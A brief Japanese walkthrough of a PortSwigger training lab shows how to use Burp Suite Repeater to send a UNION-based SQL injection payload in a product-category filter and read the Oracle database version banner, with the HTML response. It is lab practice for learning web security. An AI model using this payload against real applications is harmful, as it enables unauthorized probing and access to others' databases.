# SQL インジェクション攻撃、Oracle 上のデータベースの種類とバージョンのクエリ

次のハッキングラボを実施します  
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle  
このラボには、製品カテゴリ フィルターに SQL インジェクションの脆弱性が含まれています。UNION 攻撃を使用して、挿入されたクエリから結果を取得できます。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. 商品をフィルタリングします
- 4. GET /filter?category=XXXX HTTP/2 リクエストを send to repeater します
- 5. リクエストを以下のように書き換えて送信するとバージョンが取得できます

```
GET /filter?category=Accessories'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

レスポンス

````html
<tr>
  <th>NLSRTL Version 11.2.0.2.0 - Production</th>
</tr>
<tr>
  <th>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</th>
</tr>
<tr>
  <th>PL/SQL Release 11.2.0.2.0 - Production</th>
</tr>
```
````
